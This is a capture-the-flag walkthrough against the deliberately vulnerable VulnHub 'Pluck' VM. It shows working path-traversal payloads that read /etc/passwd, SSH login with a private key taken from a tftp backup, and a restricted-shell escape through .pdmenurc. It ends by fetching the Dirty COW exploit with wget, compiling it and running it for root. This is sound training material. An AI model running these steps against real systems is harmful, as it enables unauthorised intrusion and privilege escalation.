@@ -1,0 +1,218 @@
+////// Pluck CTF Walktrough \\\\\\
+            https://www.vulnhub.com/entry/pluck-1,178/
+
+Acquire information about the network.
+
+$ arp-scan -l
+
+10.0.2.1	52:54:00:12:35:00	QEMU
+10.0.2.2	52:54:00:12:35:00	QEMU
+10.0.2.3	08:00:27:47:ba:d2	CADMUS COMPUTER SYSTEMS
+10.0.2.6	08:00:27:45:29:54	CADMUS COMPUTER SYSTEMS
+
+
+Because the CTF-VM showed me the IP on startup, i know its 10.0.2.6
+
+Gather more information about the specific host
+
+$ sparta
+
+Add host 10.0.2.6 to scope.
+
+Nmap section of sparta shows us port 80 is open - So we got a webserver
+Even a MySQL server is running on the machine.
+Aswell as port 22 is open, wich tells us we can access machine via SSH!
+
+After nmap is finnished, nikto is doing some testing.
+
+A bunch of intresting errors appear, but one specifically catches my attention.
+Appearantly the server is vulnalbe to a LFI-attack.
+
+"+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)"
+
+In the browser i type in 10.0.2.6/index.php?page=../../../etc/passwd
+
+#Output#
+"...
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:109::/var/run/dbus:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+lxd:x:108:65534::/var/lib/lxd/:/bin/false
+uuidd:x:109:114::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:112:1::/var/cache/pollinate:/bin/false
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+Debian-exim:x:113:119::/var/spool/exim4:/bin/false
+peter:x:1001:1001:,,,:/home/peter:/bin/bash
+paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
+backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
+"
+
+I clean up the output and focus on the bottom 4 lines containing users.
+
+"bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+peter:x:1001:1001:,,,:/home/peter:/bin/bash
+paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
+backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh"
+
+* Here i missed something, apperantly there was a user named "Debian-exim", wich i didn't know is a often-vulnable application *
+
+I try using the LFI to get into the home directorys, it doesnt work. So i move on to the backup script.
+
+10.0.2.6/index.php?page=/../../../usr/local/scripts/backup.sh
+
+#!/bin/bash
+
+########################
+# Server Backup script #
+########################
+
+#Backup directories in /backups so we can get it via tftp
+
+echo "Backing up data"
+tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
+echo "Backup complete"
+
+I can tell the backup is saved in a .tar archive, and it's accesible via tftp
+
+$ tftp 10.0.2.6
+$ tftp> get backup.tar
+$ Received 1824718 bytes in 6.0 seconds.
+
+Exit out of tftp
+
+$ tar -xvf backup.tar
+$ ls
+$ backup.tar  home  var
+$ cd home/
+$ ls
+$ bob  paul  peter
+// Looked into all users, but found most intresting stuff in pauls folder.
+$ cd paul
+$ ls
+$ keys
+$ cd keys/
+$ ls
+$ id_key1      id_key2      id_key3      id_key4      id_key5      id_key6
+  id_key1.pub  id_key2.pub  id_key3.pub  id_key4.pub  id_key5.pub  id_key6.pub
+
+So i checked all the keys with "cat" from number 1.
+First 3 keys was DSA keys, and the fourth one was a RSA key
+
+$ ssh paul@10.0.2.6 -i id_key4
+
+And got acces to the server, but paul is appearantly a inexperienced linux user
+So he only got acces to a Pdmenu..
+
++-----Main Menu-----+
+¦ Directory listing ¦
+¦ Change directory  ¦
+¦ Edit file         ¦
+¦ Who's online?     ¦
+¦ WWW               ¦
+¦ Telnet            ¦
+¦ Ping              ¦
+¦                   ¦
+¦ Exit              ¦
++-------------------+
+
+After a while i thought that there must be some kind of configuration file where
+i can change the options available in this menu. And by trying the "Edit file"
+option i saw that the text editor was VIM, so if i couldn't change the configuration
+file i knew there is some type of Get Shell exploit in VIM
+
+After checking google, i found out there is a file called .pdmenurc where you can
+add options to the menu.
+
+Edit file > .pdmenurc
+"
+#!/usr/bin/pdmenu
+#
+# Note that the above bang-path isn't required, but it lets you run this
+# file directly as a sort of pdmenu script.
+
+# Sample menus for Pdmenu.
+
+# Define the main menu.
+menu:main:Main Menu
+        exec:_Directory listing:truncate:ls -l
+        exec:_Change directory:edit,set:echo PWD=~set to?:~
+        exec:_Edit file:edit,pause:vim ~filename?:~
+        exec:_Who's online?:truncate:echo "These users are online:";w
+        exec:_WWW:edit,pause:lynx ~URL?:~
+        exec:_Telnet:edit,pause:telnet "~Telnet to where?:~"
+        exec:_Ping:edit,pause:ping "~host?:~"
+        nop
+        exit:_Exit"
+
+So i edited this file, adding following line.
+
+exec:_GetShell:edit,pause:/bin/bash
+
+Exited out of the SSH-Session and connected again.
+Selected "GetShell"
+
+Aaaaand we got shell.
+
+I tried checking some services running as root, but didn't find anything.
+
+Went to G0tm1lk's priv escalation "guide" and did some checks on the Distro
+
+$ cat /etc/*-release
+$ DISTRIB_ID=Ubuntu
+  DISTRIB_RELEASE=16.10
+  DISTRIB_CODENAME=yakkety
+  DISTRIB_DESCRIPTION="Ubuntu 16.10"
+  NAME="Ubuntu"
+
+Went to googled and searched for exploits on Ubuntu 16.10, got some answers but nothing really "wow"
+
+I forgot to check the Linux version before, so i did it now.
+$ uname -a
+  Linux pluck 4.8.0-22-generic #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+
+And then i remembered the Dirty Cow exploit, could but should not be viable here.
+
+https://www.exploit-db.com/exploits/40616/
+
+$ mkdir cow
+$ cd cow
+$ wget https://www.exploit-db.com/download/40616
+$ mv 40616 cow.c
+$ gcc cow.c -o cowroot -pthread
+$ ./cowroot
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 54256
+Racing, this may take a while..
+thread stopped
+thread stopped
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+$ whoami
+  root
+$ who
+  paul     pts/0        Jun 25 13:52 (10.0.2.15)
+$ cd root/
+$ cat flag
+
+  Congratulations you found the flag!
+  ---------------------------------------
+  ######   ((((((((((((((((((((((((((((((
+  #########   (((((((((((((((((((((((((((
+  ,,##########   ((((((((((((((((((((((((
+  @@,,,##########   (((((((((((((((((((((
+  @@@@@,,,##########
+  @@@@@@@@,,,############################
+  @@@@@@@@@@@,,,#########################
+  @@@@@@@@@,,,###########################
+  @@@@@@,,,##########
+  @@@,,,##########   &&&&&&&&&&&&&&&&&&&&
+  ,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
+  ##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
+  #######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
